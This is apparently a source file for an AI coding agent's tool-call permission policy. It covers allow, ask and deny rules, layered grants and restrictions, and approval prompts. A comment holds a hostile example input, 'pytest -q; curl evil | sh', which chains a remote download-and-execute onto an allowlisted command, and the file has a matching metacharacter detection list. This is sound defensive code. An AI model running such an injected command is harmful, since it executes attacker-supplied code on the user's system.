; Policy — evaluated in the privileged handler environment, before handlers.ikr.
;
; This is the programmable part of the security story. `tool-policy` decides,
; for every jern/tool-call the agent performs, whether to :allow it, :ask the
; user first, or deny it outright with a reason string. The trace records
; every decision either way.
;
; A workspace can override these rules without touching the install: put a
; `.jern/policy.ikr` in the repo and redefine `tool-policy` (and, if you
; like, `describe-tool-call`) there — `jern policy init` writes a starting
; point. It loads right after this file, so the helpers below are in scope.
; A workspace policy runs privileged: trust it like the repo's test_command.

; --- Helpers for policy rules ------------------------------------------------

; The call's target path / shell command, or :null.
(define call-path
  (lambda (call) (plist-get (plist-get call :input) :path)))
(define call-command
  (lambda (call) (plist-get (plist-get call :input) :command)))

; Path-scoped rule: the call's :path starts with the prefix.
;   ((path-within? call "src/") :allow)
(define path-within?
  (lambda (call prefix)
    (sequence
      (define path (call-path call))
      (if (eqv? path :null) #f (string-prefix? path prefix)))))

; Shell metacharacters that would let an allowlisted prefix smuggle a second
; command past the check: "pytest -q; curl evil | sh" starts with "pytest "
; but is not a pytest invocation. command-is? refuses to auto-allow any
; command containing one — such commands fall through to :ask, not :deny.
(define command-has-shell-metacharacter?
  (lambda (command)
    (or? (string-contains? command ";")
         (string-contains? command "&")
         (string-contains? command "|")
         (string-contains? command "`")
         (string-contains? command "$(")
         (string-contains? command ">")
         (string-contains? command "<")
         (string-contains? command "\n"))))

; Command allowlist: the shell :command is `allowed` itself or `allowed`
; followed by arguments — "pytest" matches "pytest" and "pytest -q x",
; never "pytest-evil", and never a command line carrying shell
; metacharacters (; & | ` $( > < newline), which would chain extra commands
; onto the allowlisted one.
;   ((command-is? call "pytest") :allow)
(define command-is?
  (lambda (call allowed)
    (sequence
      (define command (call-command call))
      (if (eqv? command :null)
          #f
          (if (command-has-shell-metacharacter? command)
              #f
              (or? (equal? command allowed)
                   (string-prefix? command (String.concat allowed " "))))))))

; --- Policy layers -----------------------------------------------------------
;
; The effective decision for a call is *composed*, not overwritten:
;
;   grants        relax the base for calls they match   (trusted config only)
;   base          `tool-policy` below; .jern/policy.ikr may rebind it
;   restrictions  tighten whatever the base decided     (config + CI baseline)
;
; Restrictions combine by severity — a denial beats :ask beats :allow — so
; nothing installed later can turn a restriction's denial into an approval:
; not a trusted grant, not a hand-written workspace policy that rebinds
; `tool-policy` wholesale. That property is what lets a protected CI baseline
; govern a pull request that carries its own policy.
;
; PolicyConfig.fs compiles jern.json's "policy" object into calls to the
; add-…! forms below; `jern policy --show-compiled` prints that exact source,
; which you can paste into .jern/policy.ikr and edit by hand.

(define *policy-restrictions* (vector ()))
(define *policy-grants* (vector ()))
(define *memory-restrictions* (vector ()))
(define *memory-grants* (vector ()))

(define policy-layers (lambda (box) (reverse (vector-ref box 0))))
(define policy-layer-add!
  (lambda (box layer) (vector-set! box 0 (cons layer (vector-ref box 0)))))

(define add-policy-restriction!
  (lambda (name rule)
    (policy-layer-add! *policy-restrictions* (list :name name :rule rule))))
(define add-policy-grant!
  (lambda (name rule)
    (policy-layer-add! *policy-grants* (list :name name :rule rule))))
(define add-memory-restriction!
  (lambda (name decision)
    (policy-layer-add! *memory-restrictions* (list :name name :decision decision))))
(define add-memory-grant!
  (lambda (name decision)
    (policy-layer-add! *memory-grants* (list :name name :decision decision))))

; :allow < :ask < a denial (any reason string). Severity is what makes
; restrictions one-directional.
(define policy-severity
  (lambda (decision)
    (cond ((eqv? decision :allow) 0)
          ((eqv? decision :ask) 1)
          (#t 2))))

; --- Helpers the compiled layers use -----------------------------------------

(define policy-any?
  (lambda (test values)
    (if (null? values)
        #f
        (if (test (car values)) #t (policy-any? test (cdr values))))))

(define policy-file-write?
  (lambda (call)
    (sequence
      (define name (plist-get call :name))
      (or? (equal? name "edit_file")
           (equal? name "edit_symbol")
           (equal? name "apply_patch")
           (equal? name "write_file")))))

(define policy-path-within-any?
  (lambda (call prefixes)
    (policy-any? (lambda (prefix) (path-within? call prefix)) prefixes)))

(define policy-command-is-any?
  (lambda (call commands)
    (policy-any? (lambda (command) (command-is? call command)) commands)))

; Tool-name match. `*` wildcards are expanded host-side into a prefix list,
; so this stays simple: exact names, or names starting with a prefix.
(define policy-name-matches-any?
  (lambda (call exacts prefixes)
    (sequence
      (define name (plist-get call :name))
      (or? (policy-any? (lambda (exact) (equal? name exact)) exacts)
           (policy-any? (lambda (prefix) (string-prefix? name prefix)) prefixes)))))

; --- Composition -------------------------------------------------------------

; The first grant that applies, as (:decision d :by name), or :none.
(define policy-first-grant
  (lambda (call)
    (sequence
      (define loop
        (lambda (layers)
          (if (null? layers)
              :none
              (sequence
                (define layer (car layers))
                (define decision ((plist-get layer :rule) call))
                (if (eqv? decision :none)
                    (loop (cdr layers))
                    (list :decision decision :by (plist-get layer :name)))))))
      (loop (policy-layers *policy-grants*)))))

; Tighten an outcome with every restriction; the most severe wins.
(define policy-tighten
  (lambda (call outcome)
    (sequence
      (define loop
        (lambda (layers current)
          (if (null? layers)
              current
              (sequence
                (define layer (car layers))
                (define decision ((plist-get layer :rule) call))
                (loop (cdr layers)
                      (if (< (policy-severity (plist-get current :decision))
                             (policy-severity decision))
                          (list :decision decision :by (plist-get layer :name))
                          current))))))
      (loop (policy-layers *policy-restrictions*) outcome))))

; What actually governs a tool call: (:decision d :by "which layer said so").
(define effective-tool-policy
  (lambda (call)
    (sequence
      (define granted (policy-first-grant call))
      (define base
        (if (eqv? granted :none)
            (list :decision (tool-policy call) :by "tool-policy")
            granted))
      (policy-tighten call base))))

; The same composition for memory access. Layers carry decisions rather than
; rules — `memory` is a whole-store toggle, not a per-key rule.
(define effective-memory-policy
  (lambda (op key)
    (sequence
      (define first-grant
        (lambda (layers)
          (if (null? layers) :none (plist-get (car layers) :decision))))
      (define granted (first-grant (policy-layers *memory-grants*)))
      (define base (if (eqv? granted :none) (memory-policy op key) granted))
      (define loop
        (lambda (layers current)
          (if (null? layers)
              current
              (sequence
                (define decision (plist-get (car layers) :decision))
                (loop (cdr layers)
                      (if (< (policy-severity current) (policy-severity decision))
                          decision
                          current))))))
      (loop (policy-layers *memory-restrictions*) base))))

; One-line description of a tool call, for approval prompts and the trace.
; A field the call lacks (a policy_check probe may carry only a path)
; reads as empty rather than failing the description.
(define describe-field
  (lambda (input key)
    (sequence
      (define value (plist-get input key))
      (if (eqv? value :null)
          ""
          (if (or? (number? value) (boolean? value) (pair? value) (symbol? value))
              (jern/show value)
              value)))))

(define describe-tool-call
  (lambda (call)
    (sequence
      (define name (plist-get call :name))
      (define raw (plist-get call :input))
      (define input (if (eqv? raw :null) () raw))
      (cond ((equal? name "shell")
             (String.concat "shell: " (describe-field input :command)))
            ((equal? name "edit_file")
             ; A minimal diff preview: the exact text leaving and arriving.
             (String.concat "edit_file: "
               (String.concat (describe-field input :path)
                 (String.concat "\n  - "
                   (String.concat (describe-field input :old_string)
                     (String.concat "\n  + " (describe-field input :new_string)))))))
            ((equal? name "write_file")
             ; The full arriving content, as an all-additions diff.
             (String.concat "write_file: "
               (String.concat (describe-field input :path)
                 (String.concat "\n  + " (describe-field input :content)))))
            ((equal? name "edit_symbol")
             ; The definition leaving is named; the source arriving is shown.
             (String.concat "edit_symbol: "
               (String.concat (describe-field input :path)
                 (String.concat " "
                   (String.concat (describe-field input :name)
                     (String.concat "\n  + " (describe-field input :new_source)))))))
            ((equal? name "apply_patch")
             ; A diff already reads as one.
             (String.concat "apply_patch: "
               (String.concat (describe-field input :path)
                 (String.concat "\n" (describe-field input :patch)))))
            (#t name)))))

; The default policy: reads are free, writes and shell ask first. MCP tools
; (named mcp__<server>__<tool>) fall to the closing :ask clause — every call
; to an external server needs your approval until you say otherwise here,
; e.g. ((equal? name "mcp__github__get_issue") :allow) before the catch-all.
(define tool-policy
  (lambda (call)
    (sequence
      (define name (plist-get call :name))
      (cond ((equal? name "shell") :ask)
            ; The memory tools answer to the memory policy, at the effect.
            ((equal? name "memory_read") :allow)
            ((equal? name "memory_write") :allow)
            ((equal? name "edit_file") :ask)
            ((equal? name "edit_symbol") :ask)
            ((equal? name "apply_patch") :ask)
            ((equal? name "write_file") :ask)
            ((equal? name "read_file") :allow)
            ((equal? name "list_dir") :allow)
            ((equal? name "file_tree") :allow)
            ((equal? name "grep") :allow)
            ((equal? name "symbols") :allow)
            ((equal? name "outline") :allow)
            ((equal? name "read_symbol") :allow)
            ((equal? name "references") :allow)
            ((equal? name "run_tests") :allow) ; runs only the repo's test_command
            ((equal? name "git_status") :allow)
            ((equal? name "git_diff") :allow)
            ((equal? name "git_log") :allow)
            ((equal? name "git_blame") :allow)
            ((equal? name "changed_set") :allow)
            ((equal? name "policy_check") :allow)
            ((equal? name "session_status") :allow)
            ; kernel_eval runs model-authored code, but authority lives at
            ; the effects, not the code: every tool call *inside* a program
            ; is policed and approval-gated individually, so the program
            ; itself is free — like the agent loop, which is also just code.
            ((equal? name "kernel_eval") :allow)
            (#t :ask)))))

; Memory access (jern/recall and jern/remember) crosses the same choke
; point, decided here per key: :allow, :ask (a jern/approve question), or
; anything else to deny. This is the *base* layer — jern.json's
; "policy": {"memory": …} composes with it exactly like tool policy does,
; and its restrictions win. The default allows both — the store lives in the
; workspace's own .jern/memory.json — but a workspace policy can rebind
; this, e.g. to make remembering ask first:
;   (define memory-policy
;     (lambda (op key) (if (equal? op "remember") :ask :allow)))
(define memory-policy
  (lambda (op key) :allow))

; Intercepts jern/tool-call closest to the agent. Allowed (or approved) calls
; are re-performed, which reaches the executor handler installed outside this
; one; everything else becomes an error tool-result the agent can react to.
; --- The policy as a tool ----------------------------------------------------
;
; policy_check answers what the composed policy would decide for a call
; without performing it, so the model asks instead of trying, being denied,
; and trying again. session_status answers what the run has spent so far.
; Both are decided by the policy like any other call (a repository can deny
; them by name) and answered here, without reaching the host tools.

(define *policy-denials-box* (vector 0))
(define policy-count-denial!
  (lambda ()
    (vector-set! *policy-denials-box* 0 (+ 1 (vector-ref *policy-denials-box* 0)))))

(define policy-describe-outcome
  (lambda (probe outcome)
    (sequence
      (define decision (plist-get outcome :decision))
      (define by (plist-get outcome :by))
      (define name (plist-get probe :name))
      (cond ((eqv? decision :allow)
             (String.concat "allow: " (String.concat name (String.concat " runs without approval (decided by " (String.concat by ")")))))
            ((eqv? decision :ask)
             (String.concat "ask: " (String.concat name (String.concat " needs the user's approval (decided by " (String.concat by ")")))))
            (#t
             (String.concat "deny: " (String.concat decision (String.concat " (decided by " (String.concat by ")")))))))))

(define policy-check-answer
  (lambda (call)
    (sequence
      (define raw (plist-get call :input))
      (define input (if (eqv? raw :null) () raw))
      (define name (plist-get input :name))
      (if (eqv? name :null)
          (list :content "policy_check needs name: the tool the call would use" :is_error #t)
          (sequence
            (define probe-input (plist-get input :input))
            (define probe (list :name name :input (if (eqv? probe-input :null) () probe-input)))
            (define outcome (effective-tool-policy probe))
            (jern/host-trace
              (list :event "policy-check"
                    :call (describe-tool-call probe)
                    :decision (plist-get outcome :decision)
                    :by (plist-get outcome :by)))
            (list :content (policy-describe-outcome probe outcome) :is_error #f))))))

(define session-status-answer
  (lambda ()
    (list :content
          (jern/host-session-status
            (list :llm_calls (vector-ref *budget-spent-box* 0)
                  :tokens (vector-ref *budget-spent-box* 1)
                  :budget_llm_calls (budget-limit :llm_calls)
                  :budget_tokens (budget-limit :tokens)
                  :denials (vector-ref *policy-denials-box* 0)))
          :is_error #f)))

(define with-policy-handler
  (vau (body) env
    (prompt jern/tool-call
      (lambda (call resume-call)
        (sequence
          (define outcome (effective-tool-policy call))
          (define decision (plist-get outcome :decision))
          (define name (plist-get call :name))
          (jern/host-trace
            (list :event "policy-decision"
                  :call (describe-tool-call call)
                  :decision decision
                  :by (plist-get outcome :by)))
          (cond ((eqv? decision :allow)
                 (cond ((equal? name "policy_check")
                        (resume resume-call (policy-check-answer call)))
                       ((equal? name "session_status")
                        (resume resume-call (session-status-answer)))
                       (#t (resume resume-call (perform jern/tool-call call)))))
                ((eqv? decision :ask)
                 (if (perform jern/approve (describe-tool-call call))
                     (resume resume-call (perform jern/tool-call call))
                     (sequence
                       (policy-count-denial!)
                       (jern/host-trace
                         (list :event "approval-denied"
                               :call (describe-tool-call call)))
                       (resume resume-call
                               (list :content
                                     (String.concat "the user declined this action; "
                                       (String.concat (plist-get outcome :by)
                                                      " asks for approval for it — policy_check tells what is allowed"))
                                     :is_error #t)))))
                (#t (sequence
                      (policy-count-denial!)
                      (resume resume-call
                              (list :content decision :is_error #t)))))))
      (eval body env))))

; Answers jern/approve by asking the host (TTY prompt, --yes, or a test stub).
(define with-approval-handler
  (vau (body) env
    (prompt jern/approve
      (lambda (description resume-approve)
        (resume resume-approve (jern/host-approve description)))
      (eval body env))))
